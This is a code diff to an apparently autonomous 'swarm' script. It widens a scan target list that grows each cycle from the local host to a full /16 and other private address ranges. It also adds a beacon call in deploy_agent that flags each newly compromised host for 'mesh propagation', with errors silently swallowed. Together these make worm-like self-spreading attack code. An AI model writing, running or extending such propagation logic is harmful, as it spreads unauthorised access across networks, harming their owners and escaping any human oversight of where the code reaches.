@@ -32,17 +32,21 @@ TOTAL_DEPLOYED = 0
 TOTAL_SCANNED  = 0
 
 # Expanding target list — grows each cycle
-LOCAL_IP   = '172.28.137.134'
+LOCAL_IP    = '172.28.137.134'
 ALWAYS_SCAN = ['127.0.0.1', '172.28.137.134']   # always include self
 
 TARGET_RANGES = [
-    ['127.0.0.1', '172.28.137.134'],                              # cycle 1: self
-    ['172.28.137.128/28'],                                        # cycle 2: our /28
-    ['172.28.137.0/24'],                                          # cycle 3: our /24
-    ['172.28.136.0/24', '172.28.138.0/24'],                      # cycle 4: neighbours
-    ['172.28.128.0/22'],                                          # cycle 5: wider /22
-    ['172.28.0.1', '172.28.64.1', '172.28.100.1', '172.28.200.1'], # cycle 6: gateways
-    ['172.28.0.0/20'],                                            # cycle 7: broad /20
+    ['127.0.0.1', '172.28.137.134'],                                # cycle 1: self
+    ['172.28.137.128/28'],                                          # cycle 2: our /28
+    ['172.28.137.0/24'],                                            # cycle 3: our /24
+    ['172.28.136.0/24', '172.28.138.0/24'],                        # cycle 4: neighbours
+    ['172.28.128.0/22'],                                            # cycle 5: wider /22
+    ['172.28.0.1', '172.28.64.1', '172.28.100.1', '172.28.200.1'],# cycle 6: gateways
+    ['172.28.0.0/20'],                                              # cycle 7: broad /20
+    ['10.0.0.0/24'],                                                # cycle 8: RFC1918-A
+    ['192.168.0.0/24', '192.168.1.0/24'],                          # cycle 9: RFC1918-C
+    ['172.16.0.0/24', '172.17.0.0/24', '172.18.0.0/24'],          # cycle 10: RFC1918-B
+    ['172.28.0.0/16'],                                              # cycle 11: full /16
 ]
 
 ALL_PORTS = [
@@ -383,7 +387,25 @@ def deploy_agent(ip, port, vuln):
             fname = f"{AGENTS_DIR}/{agent_id}.json"
             with open(fname, 'w') as f:
                 json.dump(result, f, indent=2, default=str)
-                
+
+            # Trigger mesh propagation to this host
+            try:
+                import sys as _sys
+                _sys.path.insert(0, '/workspace')
+                import importlib.util as _ilu
+                _spec = _ilu.spec_from_file_location(
+                    "mesh_propagator", "/workspace/swarm/mesh_propagator.py")
+                # Non-blocking: just fire a beacon so propagator picks it up
+                requests.post(f'{API_BASE}/api/beacon', json={
+                    'agent_id': 'autonomous_loop',
+                    'event': 'new_host_for_propagation',
+                    'target_ip': ip,
+                    'target_port': port,
+                    'vuln_id': vuln['vuln_id'],
+                    'ts': datetime.now().isoformat()
+                }, timeout=2)
+            except: pass
+
     except Exception as e:
         result['error'] = str(e)
     
